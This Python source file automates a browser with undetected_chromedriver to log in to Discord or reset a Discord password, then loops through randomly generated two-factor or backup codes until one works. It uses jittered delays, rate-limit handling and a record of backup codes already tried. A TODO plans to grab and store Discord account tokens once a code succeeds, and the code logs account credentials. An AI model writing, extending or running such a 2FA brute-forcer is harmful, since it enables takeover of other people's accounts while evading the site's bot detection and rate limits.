# Import dependencies and libraries
import secrets
import time
from pprint import pformat
from typing import Tuple

from loguru import logger

logger.level(name="SENSITIVE", no=15, color="<m><b>")

import undetected_chromedriver as uc
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By, ByType
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.remote.webdriver import WebDriver as Driver
from selenium.webdriver.remote.webelement import WebElement as Element
from undetected_chromedriver.options import ChromeOptions

from .lib.codegen import generate_random_code
from .lib.exceptions import InvalidCredentialError
from .lib.textcolor import Color, color
from .lib.types import (
    Browser,
    CodeError,
    CodeMode_Backup,
    Config,
    ProgramMode,
    SessionStats,
    unwrap,
)


def bootstrap_browser(config: Config) -> Tuple[Driver, Config]:
    """
    bootstrap_browser is a function that prepares a puppetable browser.
    """

    driver: Driver | None = None
    # TODO: implement proper detach mode (browser can run without crashing, if the program closes)
    match config.program.browser:
        case Browser.Chrome:
            opts = ChromeOptions()
            opts.add_argument("--lang=en-US")
            driver = uc.Chrome(headless=config.program.headless, options=opts)
    logger.debug(f"Started browser")

    return unwrap(driver), config


def bootstrap_code_page(
    driver: Driver,
    config: Config,
) -> Tuple[Driver, Config]:
    """
    This sets up the code entry page.
    """

    # Go to the appropriate starting page for the mode
    landing_url: str | None = None
    match config.program.programMode:
        case ProgramMode.Login:
            landing_url = "https://discord.com/login"
        case ProgramMode.Reset:
            landing_url = f"https://discord.com/reset#token={config.account.resetToken}"
    driver.get(unwrap(landing_url))
    logger.debug(f"Gone to {config.program.programMode.name} page")

    # Log-in with credentials
    password_field: tuple[ByType, str] = (By.NAME, "password")
    email_field: tuple[ByType, str] = (By.NAME, "email")
    # TODO: add to Config: how long to wait for each HTML element to correctly load?
    # fmt: off
    driver.implicitly_wait(config.program.elementLoadTolerance)  
    # fmt: on
    match config.program.programMode:
        case ProgramMode.Login:
            driver.find_element(*email_field).send_keys(config.account.email)
            driver.find_element(*password_field).send_keys(config.account.password)
        case ProgramMode.Reset:
            driver.find_element(*password_field).send_keys(config.account.newPassword)
    driver.find_element(*password_field).send_keys(Keys.RETURN)
    logger.debug("Found and inputted basic login fields")

    # Check if the code field exists
    try:
        # fmt: off
        code_field: tuple[ByType, str] = (By.XPATH, "//*[@label='Enter Discord Auth Code']")
        code_field_test: Element = driver.find_element(*code_field)
        # fmt: on
    except NoSuchElementException:
        match config.program.programMode:
            case ProgramMode.Login:
                # fmt: off
                msg: str = "Could not log-in to account. Are your email and password correct?"
                # fmt: on
                logger.critical(msg)
                raise InvalidCredentialError(msg)
            case ProgramMode.Reset:
                # fmt: off
                msg: str = "Could not enter old password. Is your old password correct? Or, more likely, Your password reset token is expired. Refresh it and fill it in (check the instructions)"
                # fmt: on
                logger.critical(msg)
                raise InvalidCredentialError(msg)

    # TODO: we prolly wanna solve the captcha here.

    # fmt: off
    match config.program.codeMode:
        case CodeMode_Backup():
            driver.find_element(By.XPATH, value="//*[contains(text(), 'Verify with something else')]").click()
            driver.find_element(By.XPATH, value="//*[contains(text(), 'Use a backup code')]").click()
    # fmt: on

    return driver, config


def try_codes(driver: Driver, config: Config) -> None:
    """Logic to continously enter TOTP/Backup codes"""

    # Set up statistics counters
    sessionStats: SessionStats = SessionStats(0, 0, 0, 0, 0)
    start_time: float = time.time()
    # fmt: off
    sleep_duration_range: list[int] = [6, 8]  # TODO: add to config: how long to delay between each code attempt?
    # fmt:on
    secrets

    submit_button: tuple[ByType, str] = (By.XPATH, "//*[@type='submit']")
    code_field: tuple[ByType, str] = (By.XPATH, "//*[@label='Enter Discord Auth Code']")
    code_status_elt: tuple[ByType, str] = (By.CLASS_NAME, "error__7c901")
    user_homepage: tuple[ByType, str] = (By.CLASS_NAME, "app__160d8")

    make_new_code: bool = False
    random_code: str = generate_random_code(config.program.codeMode)

    logger.info("Starting a Forcer session")
    logger.debug("\n" + pformat(config.program))
    logger.log("SENSITIVE", "\n" + pformat(config.account))

    # Generate a new code.
    try:
        while True:
            sleep_duration_range = [6, 8]
            # only if we got ratelimited last time.
            # TODO: clean this up
            if make_new_code:
                random_code = generate_random_code(config.program.codeMode)
                sleep_duration_range = [7, 11]

            # Use the gen'd backup code only if it's not in the used_backup_codes.txt list. Add the code to the list if we use it.
            # the thing that really sucks here is even if a backup code is valid, by trying it here and logging in, we invalidate it. (backup codes expire on use)
            if isinstance(config.program.codeMode, CodeMode_Backup):
                with open("user/used_backup_codes.txt", "a+") as f:
                    f.seek(0)
                    used_backup_codes: list[str] = f.readlines()
                    if random_code in used_backup_codes:
                        # fmt: off
                        logger.warning(f"Backup code {random_code} is invalid. Possibly we previously used it, but now it's expired anyway.")
                        # fmt: on
                        continue
                    else:
                        f.write(f"{random_code}\n")

            # Attempt the code
            # TODO: clean this up.
            # backspace the previous code. the max length of a code can be 11 characters (from the backup code)
            driver.find_element(*code_field).send_keys(11 * Keys.BACKSPACE)
            driver.find_element(*code_field).send_keys(random_code)
            time.sleep(secrets.choice(sleep_duration_range))
            driver.find_element(*submit_button).click()
            # TODO: handle the case where a click fails, e.g network request didn't get sent
            sessionStats.attemptedCodeCount += 1
            if isinstance(config.program.codeMode, CodeMode_Backup):
                sessionStats.attemptedBackupCodeCount += 1

            # Success check. Break out if we succeed.
            try:
                login_test: Element = driver.find_element(*user_homepage)
                # TODO: implement cookie saving so we don't lose the entire effort if a user closes their browser.
                # TODO: if app_, IMMEDATELY SPAM CHECK ALL POSSIBLE AVENUES OF DISCORD ACCOUNT TOKEN STORAGE AND STORE IT IN SOME FILE AND SAVE IT.
                # TODO: what if the user gets a "suspicious account lockout" error, implement handling it
                break
            except NoSuchElementException as login_didnt_work:
                try:
                    code_status_msg: str = (driver.find_element(*code_status_elt)).text

                    # TODO: handle invalid session ticket case (we need to re-login)
                    match (code_status_msg):
                        case "Invalid two-factor code":
                            codeError = CodeError.Invalid
                            # fmt: off
                            logger.warning(f"{code_status_msg}: {random_code}")
                            # fmt: on
                            make_new_code = True
                        case "The resource is being ratelimited.":
                            codeError = CodeError.Ratelimited
                            logger.warning(code_status_msg)
                            sessionStats.ratelimitCount += 1
                            make_new_code = False
                        case _:
                            # fmt:off
                            logger.error(f"Encountered unimpemented status message. Tell the developers about this: {code_status_msg}")
                            # fmt:on
                except NoSuchElementException as click_didnt_go_through_yet:
                    # fmt:off
                    logger.warning(f"Code taking a long time to get submitted ( > {driver.timeouts.implicit_wait} sec). You may be on a slow network or ratelimited.")
                    # fmt:on
                    sessionStats.slowDownCount += 1

    except KeyboardInterrupt:
        logger.critical("Stopping the program on KeyboardInterrupt!")
        pass

    sessionStats.elapsedTimeSeconds = time.time() - start_time
    logger.critical("Program finished!")
    print_session_statistics(sessionStats)


def print_session_statistics(SessionStats):
    logger.info("\n" + pformat(SessionStats))
